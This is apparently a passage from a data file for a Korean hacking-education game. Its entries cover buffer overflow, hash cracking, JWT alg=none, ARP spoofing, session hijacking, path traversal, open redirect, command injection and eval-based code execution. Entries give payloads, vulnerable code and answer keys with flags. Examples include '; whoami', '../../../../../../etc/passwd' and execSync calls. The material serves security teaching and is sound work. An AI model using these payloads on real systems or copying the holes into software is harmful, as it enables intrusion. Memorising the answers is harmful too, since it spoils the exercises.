    title: '[튜토리얼 1단계] 위험한 입력 함수 gets()와 안전한 fgets() 찾기',
    category: '메모리 취약점',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-120',
    answer: "fgets",
    flag: 'FLAG{UNSAFE_GETS_IDENTIFIED}',
    desc: `🌟 <b>어떤 상황인가요? (눈 감고 물 붓기 비유)</b><br>
C언어의 <code>gets()</code> 함수는 "사용자가 엔터를 칠 때까지 무한정 데이터를 받아 적는" 엄청나게 위험한 함수예요.<br>
컴퓨터가 준비한 방(버퍼)은 겨우 64칸인데, 100글자든 1,000글자든 묻지도 따지지도 않고 밀어넣다가 다른 방의 중요한 서류까지 덮어써 버려요!

🔍 <b>취약점의 해결책: 방 크기를 확인하고 받는 fgets()</b><br>
이 위험한 함수를 대신하여, "버퍼 크기(64바이트)까지만 딱 잘라서 안전하게 받아라"라고 제한할 수 있는 표준 함수의 이름이 바로 <code>fgets</code> 입니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 입력 함수 이름 5글자를 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">fgets</code>`,
    code: `char buffer[64];
printf("Enter payload: ");
gets(buffer); // 길이 제한이 전혀 없는 무방비 함수!`,
    language: 'c',
    hint: "정답은 [fgets] 입니다. 키보드로 소문자 fgets 를 입력하세요."
  },
  {
    id: 'mem_1',
    title: '[실전 Level 1] 종이컵 넘쳐흐르게 만들기 (버퍼 오버플로우)',
    category: '메모리 취약점',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-120',
    answer: "python3 -c \"print('A'*64 + '\\xef\\xbe\\xad\\xde')\"",
    flag: 'FLAG{BUFFER_OVERFLOW_EXPLOITED}',
    desc: `🌟 <b>어떤 상황인가요? (넘치는 물 비유)</b><br>
컴퓨터 메모리는 "버퍼(64바이트) → 함수가 끝나고 돌아갈 비밀 주소(리턴 주소)" 순서로 딱 붙어있어요.<br>
64칸짜리 버퍼에 'A'를 64개 꽉 채운 뒤, 그 뒤에 원하는 가짜 주소를 이어붙여 밀어넣으면, 넘쳐흐른 데이터가 컴퓨터의 다음 실행 위치를 통째로 덮어써 버립니다!

🔍 <b>취약점의 비밀: 페이로드 구성</b><br>
1. <code>'A'*64</code>: 64바이트 버퍼를 넘치기 직전까지 꽉 채웁니다.<br>
2. <code>'\\xef\\xbe\\xad\\xde'</code>: 덮어쓸 특수 주소(0xdeadbeef)를 이어붙입니다.<br>
터미널에서 이진 데이터를 쉽게 만들어 쏴주는 파이썬 <code>python3 -c "print(...)"</code> 명령어를 사용합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 오버플로우 생성 파이썬 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">python3 -c "print('A'*64 + '\\xef\\xbe\\xad\\xde')"</code>`,
    code: `char buffer[64];
printf("Enter payload: ");
gets(buffer); // 64칸을 초과하면 리턴 주소가 덮어써짐!`,
    language: 'c',
    hint: "정답은 [python3 -c \"print('A'*64 + '\\xef\\xbe\\xad\\xde')\"] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'mem_e_2',
    title: '[실전 Level 1] 칠판 깨끗이 지우고 시작하기 (memset 메모리 초기화)',
    category: '메모리 취약점',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-457',
    answer: "memset(buffer, 0, sizeof(buffer));",
    flag: 'FLAG{UNINITIALIZED_STACK_LEAK_PREVENTED}',
    desc: `🌟 <b>어떤 상황인가요? (지우지 않은 칠판 비유)</b><br>
C언어는 변수를 만들었을 때 그 공간을 자동으로 0으로 비워주지 않아요!<br>
이전에 그 메모리 공간을 썼던 다른 프로그램의 흔적(비밀번호, 보안 키 등)이 그대로 남아있는데, 이걸 지우지도 않고 그대로 화면에 출력(printf)하면 시스템 비밀이 홀라당 노출됩니다!

🔍 <b>보안 패치의 핵심: memset 지우개</b><br>
<code>memset(buffer, 0, sizeof(buffer));</code> 코드를 쓰면, 버퍼의 처음부터 끝까지 모든 공간을 깨끗한 <code>0</code>으로 싹 밀어버려서 정보 유출을 완벽히 예방합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 memset 초기화 코드를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">memset(buffer, 0, sizeof(buffer));</code>`,
    code: `void print_greeting() {
  char buffer[64]; // 청소 없이 선언만 됨 (과거 쓰레기 데이터 잔존)
  // [보안 패치: memset으로 0 초기화 필요]
  printf("%s", buffer);
}`,
    language: 'c',
    hint: "memset(대상, 채울 값, 크기) 형식입니다. buffer 전체를 0으로 채우려면 크기 자리에 sizeof(buffer)를 쓰면 됩니다."
  },
  {
    id: 'mem_m_1',
    title: '[실전] 정수 오버플로우로 malloc 크기 조작',
    category: '메모리 취약점',
    role: 'Hacking',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-190',
    answer: "1073741824",
    flag: 'FLAG{INTEGER_OVERFLOW_MALLOC_TRICKED}',
    desc: `아래 코드는 사용자가 지정한 개수(size)만큼 int 배열을 할당합니다. 32비트 정수 곱셈에서 <code>size * sizeof(int)</code>가 오버플로우를 일으키면 실제로는 아주 작은 버퍼가 할당되어, 이후 반복문에서 배열 밖 메모리를 덮어쓰게 됩니다.
<div class='code-snippet'>int *buf = malloc(size * sizeof(int)); // sizeof(int) = 4</div>
👉 32비트 정수 곱셈 결과가 0으로 랩어라운드되는 지점인 <code>size</code> 값(2^32 ÷ 4)을 직접 계산해서 10진수로 입력하십시오. 정답을 미리 알려드리지 않으니 계산기로 구해보세요.`,
    code: `size_t size = atoi(argv[1]); // 검증 없이 그대로 사용
int *buf = malloc(size * sizeof(int));
for (int i = 0; i < size; i++) buf[i] = i; // 힙 오버플로우 발생 가능`,
    language: 'c',
    hint: "32비트 정수의 최대 표현 범위는 2^32 입니다. 이 값을 sizeof(int)인 4로 나눈 몫을 계산해 보세요."
  },
  {
    id: 'mem_h_1',
    title: '[고급] 포맷 스트링 취약점으로 스택 메모리 유출',
    category: '메모리 취약점',
    role: 'Hacking',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-134',
    answer: "%x %x %x %x",
    flag: 'FLAG{FORMAT_STRING_STACK_LEAKED}',
    desc: `사용자 입력이 포맷 문자열 자체로 <code>printf</code>에 전달되고 있습니다. <code>%x</code>는 다음 인자를 16진수로 출력하는데, 인자를 주지 않고 <code>%x</code>를 여러 번 넣으면 printf가 스택에 남아있는 값들을 그대로 읽어 출력해버립니다.
<div class='code-snippet'>printf(user_input); // 사용자 입력이 곧 포맷 문자열</div>
👉 스택에 남은 값 4개를 순서대로 유출시키는 페이로드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `char user_input[128];
fgets(user_input, sizeof(user_input), stdin);
printf(user_input); // 취약: printf("%s", user_input) 이어야 함`,
    language: 'c',
    hint: "다음 인자를 16진수로 출력하는 서식 지정자를 인자 개수(4개)만큼 공백으로 나열해 보세요."
  },

  {
    id: 'crypto_t_1',
    title: '[튜토리얼 1단계] 비밀번호에 무작위 양념 치기! (솔트 Salt의 원리)',
    category: '암호 해독',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-759',
    answer: "salt",
    flag: 'FLAG{SALT_CONCEPT_UNDERSTOOD}',
    desc: `🌟 <b>어떤 상황인가요? (요리 양념 비유)</b><br>
우리가 <code>1234</code>라는 쉬운 비밀번호를 쓰면, 컴퓨터는 이걸 <code>81dc9bdb52d04dc20036dbd8313ed055</code> 같은 외계어(해시 값)로 바꿔 저장해요.<br>
그런데 해커들은 흔한 단어 수억 개의 해시 값을 미리 계산해둔 <b>"암호 사전(레인보우 테이블)"</b>을 가지고 있어서, 소금 같은 양념을 치지 않으면 1초 만에 진짜 비밀번호가 탄로 납니다!

🔍 <b>취약점의 해결책: 소금(Salt) 뿌리기</b><br>
사용자마다 제각각 다른 무작위 글자(소금, Salt)를 비밀번호에 살짝 섞어서 암호화하면, 설령 두 사람이 똑같이 <code>1234</code>를 비밀번호로 써도 결과 암호문이 완전히 달라져서 해커의 사전 공격이 무력화됩니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 해시에 치는 '소금'이라는 뜻의 영어 단어 소문자 4글자를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">salt</code>`,
    code: `// 취약한 방식: 소금 없이 그대로 해싱 (사전 공격에 1초 만에 뚫림)
const hash = md5(password);

// 안전한 시큐어 코딩: 무작위 양념(salt)을 버무려 해싱
const hash2 = md5(password + salt);`,
    language: 'javascript',
    hint: "정답은 [salt] 입니다. 영어로 소금을 뜻하는 소문자 salt 를 입력하세요!"
  },
  {
    id: 'crypto_1',
    title: '[실전 Level 1] 소금 없는 순수 MD5 암호문 깨기 (Hashcat 도구)',
    category: '암호 해독',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-328',
    answer: "hashcat -m 0 md5_hashes.txt wordlist.txt",
    flag: 'FLAG{MD5_HASH_CRACKED_PLAIN}',
    desc: `🌟 <b>어떤 상황인가요? (단어 맞히기 비유)</b><br>
앞서 배운 소금(Salt) 없이 저장된 32자리 MD5 암호문들이 담긴 파일(<code>md5_hashes.txt</code>)을 확보했어요!<br>
전 세계 1위 암호 복구 도구인 <b>Hashcat</b>을 사용하면, 단어 사전(<code>wordlist.txt</code>)에 있는 단어들을 초당 수억 번씩 대입해서 원래 비밀번호를 즉시 복원할 수 있습니다.

🔍 <b>명령어 구조 이해하기</b><br>
<code>hashcat -m 0 [암호문파일] [단어사전]</code><br>
- <code>-m 0</code>: MD5 알고리즘(0번 모드)으로 풀어라!<br>
- <code>md5_hashes.txt</code>: 풀고 싶은 암호문 목록<br>
- <code>wordlist.txt</code>: 시도해 볼 일상 단어 사전

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 Hashcat MD5 크래킹 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">hashcat -m 0 md5_hashes.txt wordlist.txt</code>`,
    code: `const hash = md5(userPassword); // Salt가 없어 단어 사전(wordlist)으로 100% 역추적 가능`,
    language: 'bash',
    hint: "정답은 [hashcat -m 0 md5_hashes.txt wordlist.txt] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'crypto_e_2',
    title: '[실전 Level 1] 40자리 해시 식별과 SHA1 크래킹',
    category: '암호 해독',
    role: 'Hacking',
    level: 'Easy',
    xp: 105,
    cwe: 'CWE-328',
    answer: "hashcat -m 100 sha1_hashes.txt wordlist.txt",
    flag: 'FLAG{SHA1_HASH_CRACKED}',
    desc: `🌟 <b>어떤 상황인가요? (글자 수로 탐정 놀이 비유)</b><br>
유출된 파일(<code>sha1_hashes.txt</code>)을 보니 암호문 길이가 <b>40자리</b>입니다.<br>
MD5는 32자리지만, 40자리인 것은 바로 <b>SHA1</b> 알고리즘이에요! 암호문 글자 수만 세어봐도 어떤 알고리즘인지 탐정처럼 바로 맞힐 수 있습니다.

🔍 <b>Hashcat SHA1 모드 번호</b><br>
Hashcat에서 MD5가 <code>-m 0</code>이었다면, <b>SHA1은 <code>-m 100</code></b> 모드를 사용합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
모드 번호 100을 지정한 SHA1 크래킹 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">hashcat -m 100 sha1_hashes.txt wordlist.txt</code>`,
    code: `const hash = sha1(userPassword); // 40자리 16진수 문자열 (SHA1 알고리즘, Hashcat 모드 100)`,
    language: 'bash',
    hint: "정답은 [hashcat -m 100 sha1_hashes.txt wordlist.txt] 입니다. -m 100 으로 SHA1 모드를 지정하세요."
  },
  {
    id: 'crypto_m_1',
    title: '[실전] JWT 서명 검증 우회 (alg=none)',
    category: '암호 해독',
    role: 'Hacking',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-347',
    answer: "none",
    flag: 'FLAG{JWT_ALG_NONE_BYPASS}',
    desc: `서버가 JWT 헤더의 <code>alg</code> 값을 검증 없이 그대로 신뢰해서, 서명 알고리즘 자체를 "서명 없음"으로 바꿔 보내면 서버가 위조된 토큰을 그대로 받아들이는 경우가 있습니다.
<div class='code-snippet'>jwt.verify(token, secret, { algorithms: ['HS256', <span style="color:#f87171;">'none'</span>] })</div>
👉 서명 검증 자체를 무력화하는 JWT 헤더의 <code>alg</code> 값을 직접 입력하십시오. 정답을 미리 알려드리지 않으니, JWT 명세를 떠올려 보세요.`,
    code: `// 헤더: { "alg": "HS256", "typ": "JWT" } 를
// { "alg": "???", "typ": "JWT" } 로 바꾸고 서명 부분을 비우면?
const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });`,
    language: 'javascript',
    hint: "JWT 표준에는 서명 알고리즘 자체를 쓰지 않겠다는 뜻의 특수한 값이 정의되어 있습니다. 영어로 '없음'이라는 뜻의 단어를 소문자로 알고리즘 이름 자리에 넣어보세요."
  },
  {
    id: 'crypto_h_1',
    title: '[고급] 노출된 Salt를 이용한 해시 크래킹',
    category: '암호 해독',
    role: 'Hacking',
    level: 'Hard',
    xp: 240,
    cwe: 'CWE-328',
    answer: "hashcat -m 10 hash:salt wordlist.txt",
    flag: 'FLAG{SALTED_HASH_CRACKED_WITH_LEAKED_SALT}',
    desc: `이번엔 salt가 적용되어 있지만, API 응답 실수로 salt 값이 그대로 노출되었습니다. <code>md5(password + salt)</code> 형식의 해시는 salt를 알고 있으면 여전히 사전 대입 공격이 가능합니다.
<div class='code-snippet'>hash = md5(password + salt) // salt가 응답 JSON에 함께 노출됨</div>
👉 노출된 salt와 함께 해시를 크래킹하는 hashcat 명령어(모드 10: md5($pass.$salt))를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// API 응답 예시 (버그로 salt까지 노출됨)
{ "hash": "a1b2c3...", "salt": "x9y8z7" }`,
    language: 'bash',
    hint: "hashcat -m 10 모드는 해시와 salt를 콜론(:)으로 이어붙인 값을 한 파일처럼 취급합니다. hash:salt 형태로 크랙 대상을 지정하고, 마지막에 워드리스트 파일을 넘기세요."
  },

  {
    id: 'network_t_1',
    title: '[튜토리얼 1단계] 안전한 보안 통신의 대표 문번호 (HTTPS 443 포트)',
    category: '네트워크 패킷',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-319',
    answer: "443",
    flag: 'FLAG{HTTPS_PORT_KNOWN}',
    desc: `🌟 <b>어떤 상황인가요? (엽서 vs 봉투 비유)</b><br>
인터넷에서 데이터를 주고받을 때, <b>HTTP(80번)</b>는 누구나 읽을 수 있는 투명한 엽서와 같아서 지나가는 사람이 비밀번호를 다 엿볼 수 있어요.<br>
반면 <b>HTTPS</b>는 강력한 암호화 봉투(TLS)에 넣어 보내기 때문에 중간에서 가로채도 내용을 절대 읽을 수 없습니다!

🔍 <b>네트워크의 문 번호: 포트(Port)</b><br>
컴퓨터에는 6만 개가 넘는 문(포트 번호)이 있어요. 그중 전 세계 모든 웹 브라우저가 안전한 암호화 통신(HTTPS)을 할 때 기본으로 사용하는 문 번호가 바로 <b>443</b>번입니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 HTTPS의 기본 포트 번호 숫자 3자리를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">443</code>`,
    code: `http://target.local  → 80번 포트 (암호화 없는 위험한 평문)
https://target.local → ???번 포트 (강력한 TLS 암호화 적용)`,
    language: 'text',
    hint: "정답은 [443] 입니다. 숫자 443 세 글자를 입력해 보세요!"
  },
  {
    id: 'network_1',
    title: '[실전 Level 1] 네트워크 도청기로 비밀번호 엿보기 (tcpdump 패킷 스니핑)',
    category: '네트워크 패킷',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-319',
    answer: "tcpdump -i eth0 -vvv -X 'port 80'",
    flag: 'FLAG{CLEARTEXT_PACKET_SNIFFED}',
    desc: `🌟 <b>어떤 상황인가요? (카페 와이파이 도청 비유)</b><br>
공공 와이파이 같은 같은 네트워크 안에서, 암호화가 안 된 평문 HTTP(80번) 통신이 오가고 있어요.<br>
리눅스의 표준 도청(패킷 캡처) 도구인 <b>tcpdump</b>를 켜두면, 다른 사람이 전송한 아이디와 비밀번호가 화면에 그대로 주르륵 출력됩니다!

🔍 <b>명령어 구조 이해하기</b><br>
<code>tcpdump -i eth0 -vvv -X 'port 80'</code><br>
- <code>-i eth0</code>: 랜선/네트워크 카드(eth0)를 감시하라!<br>
- <code>-X</code>: 패킷 내용을 사람이 읽을 수 있는 글자(ASCII)로 보여줘라!<br>
- <code>'port 80'</code>: 80번(평문 HTTP) 통신만 골라서 도청하라!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 80번 포트 패킷을 덤프하는 tcpdump 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">tcpdump -i eth0 -vvv -X 'port 80'</code>`,
    code: `POST /login HTTP/1.1
Host: target.local
username=admin&password=secret_password (암호화가 없어 도청기에 그대로 노출!)`,
    language: 'bash',
    hint: "정답은 [tcpdump -i eth0 -vvv -X 'port 80'] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'network_e_2',
    title: '[실전 Level 1] 열려 있는 건물 문 전체 탐색하기 (Nmap 전체 포트 스캔)',
    category: '네트워크 패킷',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-200',
    answer: "nmap -p- target.local",
    flag: 'FLAG{NMAP_FULL_PORT_SCAN}',
    desc: `🌟 <b>어떤 상황인가요? (건물 문 정찰 비유)</b><br>
보안 진단을 시작할 때, 상대방 서버 건물에 몇 번 문들이 열려 있는지(웹 서버인지, DB인지, 파일 서버인지) 조사하는 과정을 <b>정찰(스캔)</b>이라고 해요.<br>
포트 스캐너의 제왕 <b>Nmap</b>은 기본 실행 시 흔한 1,000개 포트만 훑기 때문에, 해커가 꽁꽁 숨겨둔 비밀 포트를 못 보고 지나칠 수 있습니다!

🔍 <b>명령어의 핵심: -p- (전체 포트)</b><br>
<code>-p-</code> 옵션은 1번부터 65,535번까지 <b>"서버의 모든 문을 샅샅이 다 두드려보라"</b>는 뜻의 마법 옵션입니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 target.local 서버의 전체 포트를 스캔하는 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">nmap -p- target.local</code>`,
    code: `$ nmap target.local (기본 스캔: 자주 쓰는 1000개만 확인)
$ nmap -p- target.local (전체 스캔: 1번~65535번 모든 문을 빈틈없이 확인!)`,
    language: 'bash',
    hint: "정답은 [nmap -p- target.local] 입니다. -p 바로 뒤에 하이픈(-)을 붙여 전체 포트를 지정하세요."
  },
  {
    id: 'network_m_1',
    title: '[실전] ARP 스푸핑으로 중간자 위치 선점',
    category: '네트워크 패킷',
    role: 'Hacking',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-300',
    answer: "arpspoof -i eth0 -t 192.168.0.10 192.168.0.1",
    flag: 'FLAG{ARP_SPOOFING_MITM_POSITIONED}',
    desc: `같은 네트워크 안에서, 피해자(192.168.0.10)에게 "내가 게이트웨이(192.168.0.1)다"라고 속이는 위조된 ARP 응답을 계속 보내면, 피해자의 모든 트래픽이 공격자를 거쳐가게 만들 수 있습니다.
<br><br>👉 <code>arpspoof</code> 도구로 eth0 인터페이스에서 피해자(192.168.0.10)를 대상으로 게이트웨이(192.168.0.1)인 척 속이는 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// 정상 ARP 테이블
192.168.0.1 (gateway) → aa:aa:aa:aa:aa:aa

// 공격자가 위조 응답을 계속 보내 캐시를 오염시킴
192.168.0.1 (gateway) → attacker_mac (위조됨)`,
    language: 'bash',
    hint: "arpspoof는 -i로 네트워크 인터페이스를, -t로 속일 대상(피해자)을 지정하고, 그 뒤에 사칭하고 싶은 IP를 적습니다. 시나리오에 나온 두 IP를 이 순서에 맞게 넣어보세요."
  },
  {
    id: 'network_h_1',
    title: '[고급] 탈취한 세션 쿠키로 인증 우회',
    category: '네트워크 패킷',
    role: 'Hacking',
    level: 'Hard',
    xp: 260,
    cwe: 'CWE-319',
    answer: 'curl -H "Cookie: session_id=abc123" http://target.local/account',
    flag: 'FLAG{SNIFFED_SESSION_COOKIE_HIJACKED}',
    desc: `MITM 위치에서 스니핑한 평문 HTTP 트래픽 중 <code>Cookie: session_id=abc123</code> 헤더를 발견했습니다. HttpOnly가 아니더라도, 이 쿠키 값을 그대로 요청에 실으면 로그인 절차 없이도 해당 세션으로 위장할 수 있습니다.
<div class='code-snippet'>GET /account HTTP/1.1<br>Host: target.local<br>Cookie: session_id=abc123</div>
👉 탈취한 쿠키 값으로 <code>/account</code> 엔드포인트에 인증 없이 접근하는 curl 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// 서버는 세션 쿠키만 확인하고 다른 검증은 하지 않음
if (req.cookies.session_id === validSession) {
  return res.json(accountData);
}`,
    language: 'bash',
    hint: 'curl은 -H 옵션으로 원하는 HTTP 헤더를 직접 추가할 수 있습니다. 스니핑으로 확인한 쿠키 값을 Cookie 헤더에 그대로 실어서 요청해 보세요.'
  },

  {
    id: 'web_t_1',
    title: '[튜토리얼 1단계] 의심스러운 파일 이름 파라미터 찾기',
    category: '웹 해킹 (LFI/RCE)',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-22',
    answer: "file",
    flag: 'FLAG{VULNERABLE_PARAM_SPOTTED}',
    desc: `🌟 <b>어떤 상황인가요? (도서관 사서 비유)</b><br>
웹사이트에서 파일을 다운로드받을 때, 주소창에 <code>?file=report.pdf</code> 처럼 요청하는 경우가 많아요.<br>
그런데 프로그래머가 사용자가 적어준 파일 이름을 아무 검증 없이 서버 하드디스크 경로에 그대로 붙여버리면 엄청난 보안 허점이 생깁니다!

🔍 <b>취약점의 핵심: req.query.file</b><br>
<div class='code-snippet'>fs.readFile('/uploads/' + req.query.<span class="pt-answer">file</span>);</div>
코드를 보면 사용자의 입력을 받아오는 변수 이름이 바로 <code class="pt-answer">file</code> 입니다. 공격자는 이 변수를 이용해 서버 전체를 들여다볼 수 있습니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 취약한 파라미터 이름 영어 소문자 4글자를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">file</code>`,
    code: `app.get('/download', (req, res) => {
  fs.readFile('/uploads/' + req.query.file, (err, data) => {
    res.send(data);
  });
});`,
    language: 'javascript',
    hint: "정답은 [file] 입니다. req.query. 뒤에 붙어있는 단어 file 을 소문자로 입력하세요."
  },
  {
    id: 'web_1',
    title: '[실전 Level 1] 계단 타고 비밀 금고 파일 훔쳐보기 (Path Traversal ../)',
    category: '웹 해킹 (LFI/RCE)',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-22',
    answer: "../../../../../../etc/passwd",
    flag: 'FLAG{PATH_TRAVERSAL_PASSWD_FOUND}',
    mockUi: {
      urlBar: 'target.local/download',
      siteLabel: '📁 자료실 파일 다운로드 (경로 조작 실습)',
      fieldLabel: '다운로드할 파일명 (file)',
      fieldPlaceholder: '../../../../../../etc/passwd 입력하기',
      buttonLabel: '다운로드',
    },
    desc: `🌟 <b>어떤 상황인가요? (계단 타고 위층 가기 비유)</b><br>
컴퓨터 파일 시스템에서 <code>../</code> 는 <b>"현재 폴더에서 한 계단 위(상위 폴더)로 올라가라"</b>는 기호예요.<br>
자료실 폴더(<code>/var/www/uploads/</code>)에 갇혀있더라도, <code>../</code> 를 6번 연달아 쓰면 건물의 최상층(루트 디렉터리 <code>/</code>)까지 거슬러 올라간 뒤, 리눅스 핵심 계정 명부가 담긴 <code>/etc/passwd</code> 파일을 몰래 빼내올 수 있습니다!

🔍 <b>취약점의 비밀</b><br>
<div class='code-snippet'>fs.readFile('/var/www/uploads/' + <span style="color:#f87171;">../../../../../../etc/passwd</span>);</div>
결과적으로 <code>/etc/passwd</code> 파일이 열리면서 서버 내부의 모든 계정 이름이 화면에 출력됩니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 다운로드 파일명 칸에 ../ 를 6번 반복한 뒤 etc/passwd 를 이어붙여 입력하고 [다운로드]를 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">../../../../../../etc/passwd</code>`,
    code: `const filename = req.query.file;
// ../ 검증이 전혀 없어 서버의 어떤 파일이든 읽을 수 있음!
fs.readFile('/var/www/uploads/' + filename);`,
    language: 'javascript',
    hint: "정답은 [../../../../../../etc/passwd] 입니다. 점 두 개와 슬래시(../)를 6번 적고 etc/passwd 를 붙이세요."
  },
  {
    id: 'web_e_2',
    title: '[실전 Level 1] 가짜 팻말로 피싱 사이트 유도하기 (Open Redirect)',
    category: '웹 해킹 (LFI/RCE)',
    role: 'Hacking',
    level: 'Easy',
    xp: 105,
    cwe: 'CWE-601',
    answer: "https://evil.com",
    flag: 'FLAG{OPEN_REDIRECT_PHISHING_CRAFTED}',
    mockUi: {
      urlBar: 'target.local/login',
      siteLabel: '🔐 안전한 로그인 (피싱 링크 조작 실습)',
      fieldLabel: '로그인 후 이동할 주소 (next)',
      fieldPlaceholder: 'https://evil.com 입력하기',
      buttonLabel: '테스트 이동',
    },
    desc: `🌟 <b>어떤 상황인가요? (가짜 이정표 비유)</b><br>
로그인을 마치면 원래 보던 페이지로 돌려보내기 위해 <code>?next=/dashboard</code> 같은 주소를 써요.<br>
그런데 서버가 이 목적지 주소가 우리 사이트가 맞는지 확인하지 않으면, 해커가 <code>?next=https://evil.com</code> 처럼 가짜 악성 사이트 주소를 바꿔치기할 수 있어요!

🔍 <b>취약점의 비밀: 진짜 사이트 주소로 속이기</b><br>
피해자는 겉보기에 <code>https://target.local/login...</code> 으로 시작하니 안심하고 링크를 누르지만, 로그인하자마자 해커가 만든 복제 피싱 사이트로 납치당하게 됩니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 이동 주소(next) 칸에 공격자 외부 사이트 주소를 입력하고 [테스트 이동]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">https://evil.com</code>`,
    code: `app.post('/login', (req, res) => {
  authenticateUser(req.body);
  // 위험: 목적지가 외부 악성 사이트인지 검증하지 않고 리다이렉트
  res.redirect(req.query.next);
});`,
    language: 'javascript',
    hint: "정답은 [https://evil.com] 입니다. 프로토콜 https:// 를 포함해 그대로 입력하세요."
  },
  {
    id: 'web_m_1',
    title: '[실전] 명령어 인젝션으로 임의 명령 실행',
    category: '웹 해킹 (LFI/RCE)',
    role: 'Hacking',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-78',
    answer: "; whoami",
    flag: 'FLAG{COMMAND_INJECTION_WHOAMI_EXECUTED}',
    mockUi: {
      urlBar: 'target.local/tools/ping',
      siteLabel: '📡 네트워크 핑 테스트 도구',
      fieldLabel: '대상 호스트 (Host)',
      fieldPlaceholder: '예: 8.8.8.8',
      buttonLabel: '핑 테스트 실행',
    },
    desc: `이 서버의 "핑 테스트" 기능은 사용자가 입력한 호스트 주소를 검증 없이 셸 명령어에 그대로 이어붙입니다. 세미콜론(;)으로 명령어를 구분하면 원래 의도한 ping 뒤에 다른 명령어를 추가로 실행시킬 수 있습니다.
<div class='code-snippet'>exec('ping -c 4 ' + <span style="color:#f87171;">req.query.host</span>);</div>
👉 ping 실행 뒤에 이어서 <code>whoami</code> 명령어를 실행시키는 페이로드를 직접 작성하십시오 (세미콜론 포함). 정답 형식은 미리 알려드리지 않습니다.`,
    code: `app.get('/ping', (req, res) => {
  exec('ping -c 4 ' + req.query.host, (err, stdout) => {
    res.send(stdout);
  });
});`,
    language: 'javascript',
    hint: "셸에서 세미콜론(;)은 한 줄에 명령어 두 개를 순서대로 실행하라는 구분자입니다. 그 뒤에 원하는 명령어를 붙여보세요."
  },
  {
    id: 'web_h_1',
    title: '[고급] 안전하지 않은 eval()로 원격 코드 실행',
    category: '웹 해킹 (LFI/RCE)',
    role: 'Hacking',
    level: 'Hard',
    xp: 260,
    cwe: 'CWE-94',
    answer: "require('child_process').execSync('whoami')",
    flag: 'FLAG{UNSAFE_EVAL_RCE_ACHIEVED}',
    mockUi: {
      urlBar: 'target.local/calc',
      siteLabel: '🧮 온라인 계산기',
      fieldLabel: '계산할 수식',
      fieldPlaceholder: '예: 1+2*3',
      buttonLabel: '계산하기',
    },
    desc: `이 "계산기" API는 사용자가 보낸 수식 문자열을 검증 없이 그대로 <code>eval()</code>에 전달합니다. JavaScript의 <code>eval()</code>은 문자열을 코드로 실행하기 때문에, 수식 대신 임의의 Node.js 코드를 실행시킬 수 있습니다.
<div class='code-snippet'>const result = eval(<span style="color:#f87171;">req.body.expression</span>);</div>
👉 <code>child_process</code> 모듈을 이용해 서버에서 <code>whoami</code> 명령어를 실행시키는 페이로드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `app.post('/calc', (req, res) => {
  const result = eval(req.body.expression); // 매우 위험
  res.json({ result });
});`,
    language: 'javascript',
    hint: "Node.js에서 외부 명령어를 실행하는 표준 모듈은 child_process 입니다. require로 불러온 뒤, 명령어를 동기적으로 실행하고 결과를 반환하는 메소드를 찾아보세요."
  },

  {
    id: 'forensic_t_1',
    title: '[튜토리얼 1단계] 외계어 바이너리 속 글자만 쏙쏙 뽑아내기 (strings)',
    category: '디지털 포렌식',
    role: 'Hacking',
